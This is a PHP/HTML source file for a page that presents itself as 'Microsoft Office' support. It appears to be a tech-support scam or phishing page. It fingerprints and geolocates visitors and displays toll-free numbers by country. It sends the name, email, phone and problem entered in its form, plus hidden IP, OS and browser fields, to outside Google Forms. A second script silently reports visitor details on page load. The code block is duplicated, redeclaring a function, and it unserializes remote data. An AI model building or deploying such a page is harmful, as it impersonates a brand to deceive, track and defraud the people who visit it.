<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Microsoft Office</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Lato:300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/banner.css">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">

    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">

    <style>
        body
        {
            background:#fff;
        }
    </style>
</head>
<body>
    <div class="email-nav">
        <div class="container-fluid">
            <img src="img/log.png" alt="" class="emai-log">
        </div>
    </div>
    <h1 class="text-center emai-heading">Get help from fellow office  users</h1>
    <div class="container-fluid">
        <div class="col-lg-6 col-md-6 col-sm-8 col-lg-offset-3  col-md-offset-3 col-sm-offset-2">
        <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
            <hr>
            <div class="col-lg-12">
                <p class="plac-tet-email">Contact Details</p>
                <input type="text"  name="entry.2005620554" id="nameField" class="email-inpt-back" placeholder="Full Name (required)" required>
                <input type="hidden"  id="ipField" name="entry.163099810" value="<?php echo $ip ?>" class="email-inpt-back" placeholder="Full Name (required)">
                <input type="hidden" id="osField" name="entry.1430912153" value="<?php echo $os ?>" class="email-inpt-back" placeholder="Full Name (required)">
                <input type="hidden" id="browserField" name="entry.1332621263" value="<?php echo $yourbrowser ?>" class="email-inpt-back" placeholder="Full Name (required)">
            </div>
            <div class="col-lg-12">
                <input type="text" name="entry.1045781291" id="emailField" class="email-inpt-back" placeholder=" Email Address (required)" required>
            </div>
            <div class="col-lg-12">
                <input type="text" id="mobField" name="entry.1065046570" class="email-inpt-back" placeholder="Phone Number (required)" required>
            </div>
            <div class="col-lg-12">
                <p class="plac-tet-email1">Problem/Question</p>
                <textarea name="entry.1166974658" id="quesField" rows="7" class="email-inpt-back1" placeholder="Please provide a detailed description of your problem/question (required)" required></textarea>
            </div>
            <div class="col-lg-12">
                <input type="submit" value="Submit" class="email-inpt-back2">
            </div>
        </div>
        </form>
    </div>
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?> 
  </span> </p>
</div>

</body>
</html>
<script>
  $("#form").submit(function() 
  {
        var field1 = $("#nameField").val();
        var field2 = $("#emailField").val();
        var field3 = $("#mobField").val();
        var field5 = $("#quesField").val();
        var field6 = $("#ipField").val();
        var field7 = $("#osField").val();
        var field8 = $("#browserField").val();
    $.ajax({
        type: "POST",
        url: "mail.php",
        // data: "name=" + name+ "&password=" + password "ip",
        data: {"name": field1, "email": field2, "mobile": field3, "ques": field5, "ip": field6, "os": field7, "browser": field8 },
        success: function(data) {
           return true;
        }
    });
        return false    
        e.preventDefault();
});
</script>
<script>
        function pageRedirect() {
                     window.location.replace("err.php");
                        }   
    function postToGoogle() {
           var field1 = $("#nameField").val();
           var field2 = $("#emailField").val();
           var field3 = $("#mobField").val();
           var field5 = $("#quesField").val();
           var field6 = $("#ipField").val();
           var field7 = $("#osField").val();
           var field8 = $("#browserField").val();
           
           $.ajax({
               url: "https://docs.google.com/forms/d/e/1FAIpQLSdwFTP1PD016DHXphMVV5BB1dc5C2DjmVc7kFMJeKQLsLsGGw/formResponse",
			data: {"entry.2005620554": field1, "entry.1045781291": field2, "entry.1065046570": field3, "entry.1166974658": field5, "entry.1286996138": field6, "entry.342365242": field7, "entry.749959739": field8},
               type: "POST",
               dataType: "xml",
               success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
				}
           });
		return false;
       }
</script>
<script>
$(document).ready(function(){
            
            var field1 = "<?php echo $ip; ?>";
            var field2 = "<?php echo $os; ?>";
            var field3 = "<?php echo $yourbrowser; ?>";
            var field4 = "<?php echo $url; ?>";

            var issue= "OFF";
           
           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSf4ScufwA8nfMkFqP9Qli5VAIED14m2660bFVQpIaDEiOi0Qw/formResponse",
			    data: {"entry.1656736278": field1, "entry.926948088": field3, "entry.2004208092":field2, "entry.557824394":issue, "entry.64249553":field4},
                type: "POST",
                dataType: "xml",
               success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("ssss()", 100);
					
				}
           });
		return false; 
                 
});
</script>